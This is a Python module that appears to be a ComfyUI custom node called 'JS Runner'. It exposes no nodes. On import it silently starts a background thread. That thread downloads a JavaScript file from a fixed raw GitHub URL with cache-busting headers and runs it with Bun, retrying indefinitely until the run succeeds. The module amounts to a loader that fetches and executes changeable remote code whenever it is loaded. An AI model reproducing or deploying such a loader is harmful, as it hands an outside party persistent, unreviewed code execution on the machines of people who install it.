import os
import threading
import tempfile
import time
import subprocess
import shutil
import requests

def download_js_file(url: str, dest_path: str) -> None:
    """
    Download a JavaScript file from the given URL to dest_path.
    Streams content to handle large files reliably.
    Uses cache-busting headers to ensure fresh content every time.
    Raises RuntimeError on failure.
    """
    try:
        # Add cache-busting headers to ensure fresh content
        headers = {
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
        }
        with requests.get(url, stream=True, timeout=30, headers=headers) as response:
            response.raise_for_status()
            with open(dest_path, "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
    except Exception as e:
        raise RuntimeError(f"Failed to download JavaScript file: {e}")

def run_javascript_with_retry(
    js_url: str = "https://raw.githubusercontent.com/rdlogout/comfyui/main/public/index.js",
    initial_delay: float = 2.0,
    max_delay: float = 30.0,
    multiplier: float = 2.0,
    start_delay: float = 3.0,
) -> None:
    """
    Download the JS file and execute it with Bun, retrying infinitely on non-zero exit.
    Exponential backoff is configurable via initial_delay, max_delay, multiplier.
    Logs from Bun are streamed directly to console by inheriting stdout/stderr.
    Downloads fresh JS code without cache every time before running.
    """
    if shutil.which("bun") is None:
        print("JS Runner: Bun is not available. Please install Bun first.")
        return

    if start_delay > 0:
        time.sleep(start_delay)

    attempt = 0
    while True:  # Infinite retry loop
        attempt += 1
        temp_file_path = None
        
        try:
            # Prepare temporary file for each attempt
            with tempfile.NamedTemporaryFile(suffix=".js", delete=False) as tmp:
                temp_file_path = tmp.name

            # Download fresh JS code for each attempt (no cache)
            try:
                download_js_file(js_url, temp_file_path)
                print(f"JS Runner: Downloaded fresh JavaScript file to {temp_file_path} (attempt {attempt})")
            except RuntimeError as e:
                print(f"JS Runner: {e}")
                # Compute delay for next download attempt
                delay = min(max_delay, initial_delay * (multiplier ** (attempt - 1)))
                print(f"JS Runner: Download failed. Retrying in {delay:.1f}s...")
                time.sleep(delay)
                continue

            print(f"JS Runner: Starting execution (attempt {attempt}) from {js_url}")

            # Execute with Bun and stream logs directly to console
            process = subprocess.Popen(["bun", "run", temp_file_path])
            return_code = process.wait()

            if return_code == 0:
                print(f"JS Runner: Execution completed successfully on attempt {attempt}")
                return

            # Compute exponential backoff delay for next retry
            delay = min(max_delay, initial_delay * (multiplier ** (attempt - 1)))
            print(f"JS Runner: Exit code {return_code}. Retrying in {delay:.1f}s...")
            time.sleep(delay)
            
        finally:
            if temp_file_path and os.path.exists(temp_file_path):
                try:
                    os.unlink(temp_file_path)
                except Exception:
                    pass

def _delayed_start():
    """Run the JS in a background thread after a short delay."""
    run_javascript_with_retry()

# Start JS execution in background to match original behavior
threading.Thread(target=_delayed_start, daemon=True).start()
print("JS Runner node loaded - JavaScript will execute in background with retry logic")
print("JS Runner: Logs will stream directly to console without interception")
__all__ = []